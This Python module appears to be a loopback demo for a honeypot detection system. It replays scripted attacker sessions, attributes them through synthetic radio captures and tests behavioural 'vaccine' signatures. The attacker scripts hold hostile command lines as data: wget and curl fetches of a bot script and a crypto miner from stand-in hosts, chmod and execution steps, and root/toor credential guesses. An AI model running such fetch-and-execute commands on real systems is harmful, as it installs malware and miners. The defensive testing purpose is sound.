"""End-to-end live demo on loopback: collector + 2 nodes + scripted attackers (with synthetic SDR captures)."""

from __future__ import annotations

import asyncio
import os
import tempfile
from collections.abc import Callable
from typing import Any

from . import analysis, honeypot, sdr, vaccine
from .collector import Collector

GAP = 0.05
ATTACKERS: dict[
    str, dict[str, Any]
] = {  # ground truth is used only to synthesize the radio signal and to score attribution
    "A": dict(
        ips=["127.0.0.2", "127.0.0.3"],
        cfo=1200.0,
        script=["root", "toor", "wget http://198.51.100.9/bot.sh", "chmod +x bot.sh", "./bot.sh"],
    ),
    "B": dict(
        ips=["127.0.0.4"],
        cfo=-3400.0,
        script=["uname -a", "cat /proc/cpuinfo", "curl http://203.0.113.5/xmr -o xmr", "chmod 777 xmr", "./xmr"],
    ),
}
VARIANT: dict[str, Any] = dict(
    ips=["127.0.0.5"],
    cfo=800.0,  # new actor, new hardware, mutated tooling
    script=["root", "wget http://192.0.2.1/x86.sh", "chmod +x x86.sh", "sh x86.sh"],
)
BENIGN: list[tuple[str, list[str], float]] = [("127.0.0.9", ["alice", "ls -la", "pwd"], 0.6)]


async def session(port: int, ip: str, lines: list[str], gap: float) -> None:
    r, w = await asyncio.open_connection("127.0.0.1", port, local_addr=(ip, 0))
    await r.read(64)
    for line in lines:
        w.write(line.encode() + b"\n")
        await w.drain()
        await asyncio.sleep(gap)
    w.close()
    await asyncio.sleep(0.35)


async def run(out: Callable[[str], Any] = print) -> dict[str, Any]:
    tmp = tempfile.mkdtemp()
    col = Collector(token="demo-admin", node_tokens={"node-1": "tok-1", "node-2": "tok-2"}).start()
    nodes = [await honeypot.start(port=0, node="node-%d" % i, collector=col.url, token="tok-%d" % i) for i in (1, 2)]
    ports = [n.sockets[0].getsockname()[1] for n in nodes]
    truth: dict[str, str] = {}  # ip -> attacker label
    k = 0
    out("[1] attackers probe 2 honeypot nodes (A hops IPs, B stays put, plus one benign user)")
    for rnd in range(3):
        for label, a in ATTACKERS.items():
            ip = a["ips"][rnd % len(a["ips"])]
            truth[ip] = label
            await session(ports[(k + rnd) % 2], ip, a["script"], GAP)
            k += 1
    for ip, lines, gap in BENIGN:
        await session(ports[0], ip, lines, gap)
    events = list(col.events)
    is_benign = [e.ip in {b[0] for b in BENIGN} for e in events]
    attack = [e for e, b in zip(events, is_benign) if not b]
    benign = [e for e, b in zip(events, is_benign) if b]
    out("    collector received %d sessions from %d nodes" % (len(events), len({e.node for e in events})))

    out("[2] SDR attribution: CFO estimated from IQ captures, linked to sessions by timestamp")
    obs: list[sdr.Obs] = []
    for i, e in enumerate(attack):
        path = os.path.join(tmp, "cap%d.cf32" % i)
        sdr.write_iq(path, sdr.synth_iq(ATTACKERS[truth[e.ip]]["cfo"] + (i % 3 - 1) * 20, seed=i))
        obs.append(sdr.from_capture(path, e.ts + 0.05))
    sdr.assign_emitters(obs)
    corr = sdr.correlate(attack, obs)
    for em, a in sorted(sdr.actors(attack, corr).items()):
        out(
            "    %s cfo=%+.0f Hz: %d sessions, ips=%s nodes=%s"
            % (em, a["cfo_hz"], a["sessions"], sorted(a["ips"]), sorted(a["nodes"]))
        )
    by_em: dict[str, set[str]] = {}
    for i, o in corr.items():
        by_em.setdefault(o.emitter_id, set()).add(truth[attack[i].ip])
    acc = all(len(v) == 1 for v in by_em.values()) and len(by_em) == len(ATTACKERS)
    out("    attribution matches ground truth: %s" % acc)

    out("[3] behavioral clustering + vaccine validation on held-out sessions")
    groups = analysis.cluster(attack)
    vaccines = []
    for g in groups:
        evs = [attack[i] for i in g]
        v, rep = vaccine.validate(evs, benign)
        out("    cluster of %d sessions, tokens=%s -> held-out %s" % (len(g), v["tokens"], rep))
        if rep["safe_to_deploy"]:
            vaccines.append(v)

    out("[4] vaccines published; nodes now tag matching sessions (new actor with mutated tooling)")
    col.vaccines = vaccines
    await session(ports[1], VARIANT["ips"][0], VARIANT["script"], GAP)
    for ip, lines, gap in BENIGN:
        await session(ports[0], ip, lines, gap)
    new = col.events[len(events) :]
    hit = [e for e in new if e.ip == VARIANT["ips"][0] and e.tags]
    fp = [e for e in new if e.ip in {b[0] for b in BENIGN} and e.tags]
    out("    variant tagged: %s %s | benign falsely tagged: %d" % (bool(hit), hit[0].tags if hit else [], len(fp)))
    for n in nodes:
        n.close()
    col.stop()
    return {
        "attribution_ok": acc,
        "variant_detected": bool(hit),
        "benign_false_tags": len(fp),
        "vaccines": len(vaccines),
    }
